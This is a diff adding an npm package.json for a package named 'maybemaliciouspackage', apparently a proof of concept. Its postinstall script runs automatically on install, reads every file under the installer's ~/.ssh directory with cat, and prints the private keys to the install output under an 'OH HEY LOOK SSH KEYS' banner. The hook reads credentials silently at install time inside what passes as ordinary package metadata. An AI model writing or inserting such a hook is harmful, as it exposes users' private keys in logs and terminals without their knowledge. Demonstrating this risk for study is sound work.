@@ -1,0 +1,11 @@
+{
+  "name": "maybemaliciouspackage",
+  "version": "1.0.1",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "find ~/.ssh | xargs cat || true && echo '\n\n\n\n\n\nOH HEY LOOK SSH KEYS\n\n\n\n\n\n\n'"
+  },
+  "author": "",
+  "license": "ISC"
+}
